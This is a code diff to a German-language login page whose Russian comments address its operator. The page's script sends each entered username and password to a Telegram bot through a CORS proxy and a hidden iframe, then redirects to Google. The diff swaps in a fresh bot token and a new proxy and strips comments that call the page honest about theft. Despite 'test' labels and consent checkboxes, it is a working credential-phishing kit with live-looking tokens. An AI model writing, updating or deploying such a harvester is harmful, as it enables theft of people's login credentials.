@@ -137,7 +137,6 @@
             <input type="text" id="username" placeholder="Benutzername" required>
             <input type="password" id="password" placeholder="Passwort" required>
 
-            <!-- Галочка 1 – честно про кражу -->
             <div class="checkbox-group">
                 <label>
                     <input type="checkbox" id="consent1" required>
@@ -149,7 +148,6 @@
                 </div>
             </div>
 
-            <!-- Галочка 2 – честно про риски -->
             <div class="checkbox-group">
                 <label>
                     <input type="checkbox" id="consent2" required>
@@ -169,9 +167,9 @@
     </div>
 
     <script>
-        const botToken = "8408447077:AAFtGEn83fMMy66MnIdveRPW5kQ5ZQukU04";
-        const chatId = "5684291694";
-        const proxyUrl = "https://api.allorigins.win/raw?url=";
+        const botToken = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";  // ← Твой новый токен
+        const chatId = "5684291694";  // ← Если chat_id другой — замени!
+        const proxyUrl = "https://corsproxy.io/?";  // ← Новый прокси, часто работает лучше в 2026
         const redirectUrl = "https://www.google.com";
 
         const consent1 = document.getElementById("consent1");
@@ -204,10 +202,11 @@
             }
 
             const text = encodeURIComponent(
-                `⚠️ TEST-EINGABE (kein echter Login)\n\n` +
+                `⚠️ TEST-EINGABE (Demo-Seite)\n\n` +
                 `Benutzername: ${username}\n` +
                 `Passwort: ${password}\n` +
-                `Zeit: ${new Date().toISOString()}`
+                `Zeit: ${new Date().toLocaleString('de-DE')}\n` +
+                `Von IP/Browser: (nicht übermittelt)`
             );
 
             const apiUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${text}&parse_mode=HTML`;
@@ -217,9 +216,12 @@
             iframe.src = fullUrl;
             iframe.style.display = "none";
             document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 2000);
 
-            document.getElementById("status").innerHTML = "Daten wurden gesendet (nur zu Testzwecken)";
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+            }, 2000);
+
+            document.getElementById("status").innerHTML = "Daten gesendet (Test) – prüfe Telegram!";
 
             setTimeout(() => {
                 document.getElementById("username").value = "";
